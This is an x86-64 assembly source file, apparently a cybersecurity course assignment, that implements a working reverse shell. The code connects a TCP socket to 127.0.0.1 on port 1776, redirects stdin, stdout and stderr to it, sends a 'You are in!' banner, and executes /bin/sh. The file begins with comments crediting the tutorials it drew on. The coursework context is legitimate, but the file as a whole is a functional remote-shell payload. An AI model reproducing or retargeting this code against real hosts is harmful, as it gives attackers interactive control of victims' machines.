; Documentation: I referenced Labs3_2 and 3_3 for the creation/connection of socket and the execve call.
; I referenced https://medium.com/@bytesoverbombs/x64-slae-assignment-2-reverse-shell-c4b0ace4e34e for help with the dup2 call to redirect stdin, stdout, and stderr.
; I referenced https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ for help with all of the system calls.
; I referenced https://man7.org/linux/man-pages/man3/sendto.3p.html to help with the sendto system call for sending the message.
; I referenced https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm for the cmp and jmp commands used for error checking.
; I referenced https://man7.org/linux/man-pages/man2/shutdown.2.html to help with the shutdown system call for clean socket shutdown.
; I referenced man7.org for all of the system calls to verify return values.
; I referenced https://www.tutsmake.com/upload-project-files-on-github-using-command-line/ for help with github and creating/pushing to repository.

; Matthew Dickerman
; CyS333 PEX1
; 31 Aug 2022

SECTION .data

msg: db `Success! You are in!\n`,0
shell: db `/bin/sh`,0

SECTION .text

global_start

_start:

mov RAX, 41 ; socket syscall
mov RDI, 2  ; AF_INET
mov RSI, 1  ; SOCK_STREAM
mov RDX, 0  ; protocol
syscall

CMP RAX, 0 ; error handling (compare return value)
JL _exit   ; if negative return value, exit

mov R12, RAX ; saves FD

_sockaddr:
xor RAX, RAX		; zero out rax
push RAX		; put rax on stack
push dword 0x0100007F	; IP address (127.0.0.1)
add RSP, 4		; offset
push word 0xF006	; port 1776
push word 0x0002	; AF_INET family

mov R13, RSP		; store pointer

_connect:

mov RAX, 42	; connect syscall
mov RDI, R12	; file descriptor
mov RSI, R13	; socket address
mov RDX, 16	; length of address
syscall

CMP RAX, 0	; error handling (compare return value)
JL _exit	; if negative return value, exit

_dup2:

mov RAX, 33	; dup2 syscall
mov RDI, R12	; old file descriptor
mov RSI, 0	; new file descriptor
syscall

CMP RAX, 0	; error handling (compare return value)
JL _exit	; if negative return value, exit

mov RAX, 33	; dup2 syscall
mov RDI, R12	; old file descriptor
mov RSI, 1	; new file descriptor
syscall

CMP RAX, 0	; error handling (compare return value)
JL _exit	; if negative return value, exit

mov RAX, 33	; dup2 syscall
mov RDI, R12	; old file descriptor
mov RSI, 2	; new file descriptor
syscall

CMP RAX, 0	; error handling (compare return value)
JL _exit	; if negative return value, exit

_sendto:

mov RAX, 44	; sendto syscall
mov RDI, R12	; file descriptor
mov RSI, msg	; message to be sent
mov RDX, 21	; length of message
mov R8, R13 	; socket address
mov R9, 16	; length of address
syscall

CMP RAX, 0	; error handling (compare return value)
JL _exit	; if negative return value, exit

_sys_execve:

mov RAX, 59	; execve syscall
lea RDI, [shell]	; shell address
lea RSI, [RSP + 8]	; argv
lea RDX, [RSP + 24]	; envp
syscall

CMP RAX, 0	; error handling (compare return value)
JL _exit	; if negative return value, exit

_exit:

mov RAX, 48	; shutdown syscall
mov RDI, R12	; file descriptor
mov RSI, 2	; shut_rdwr (no more interaction)
syscall

mov RAX, 60 	; exit
mov RDI, 0	; exit code
syscall

